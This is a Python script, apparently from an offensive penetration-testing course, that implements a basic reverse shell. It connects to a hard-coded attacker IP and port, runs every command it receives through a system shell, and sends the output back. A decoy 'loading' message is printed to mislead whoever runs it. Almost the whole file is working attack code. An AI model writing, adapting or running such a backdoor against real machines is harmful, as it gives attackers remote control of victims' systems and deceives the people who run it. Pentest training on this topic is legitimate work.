# Python For Offensive PenTest: A Complete Practical Course - All rights reserved 
# Follow me on LinkedIn https://jo.linkedin.com/in/python2


# Basic TCP Client

import socket # For Building TCP Connection
import subprocess # To start the shell in the system

print("hi bro just wait for some sec it is just loading........")
def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # start a socket object 's' 
    s.connect(('192.168.30.197', 8080)) # 192.168.30.197 Here we define the Attacker IP and the listening port 192.168.140.130
    
 
    while True: # keep receiving commands from the Kali machine
        command = s.recv(3072).decode() # read the first KB of the tcp socket
        
        if 'terminate' in command: # if we got termiante order from the attacker, close the socket and break the loop
            s.close()
            break 
        
        else: # otherwise, we pass the received command to a shell process
            
            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            s.send( CMD.stdout.read() ) # send back the result
            s.send( CMD.stderr.read() ) # send back the error -if any-, such as syntax error
            
def main ():
    connect()
main()

